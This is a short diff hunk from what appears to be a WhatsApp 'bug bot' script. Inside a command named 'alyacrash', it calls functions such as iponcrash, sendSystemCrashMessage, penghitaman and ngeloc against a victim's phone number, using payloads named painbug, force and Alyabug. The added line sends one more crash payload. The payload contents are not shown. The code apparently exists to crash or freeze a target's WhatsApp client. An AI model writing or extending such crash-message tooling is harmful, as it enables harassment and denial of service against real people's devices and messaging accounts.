@@ -21297,6 +21297,7 @@ case "alyacrash": {
         await penghitaman(whatsappNumber, painbug, Alyabug);
         await iponcrash(whatsappNumber, force);
         await sendSystemCrashMessage(whatsappNumber, force);
+        await penghitaman(whatsappNumber, painbug, Alyabug);
         await sendPaymentInfoMessage(whatsappNumber, painbug);
         await sendSystemCrashMessage(whatsappNumber, force2, painbug);
         await ngeloc(whatsappNumber, force2, painbug);
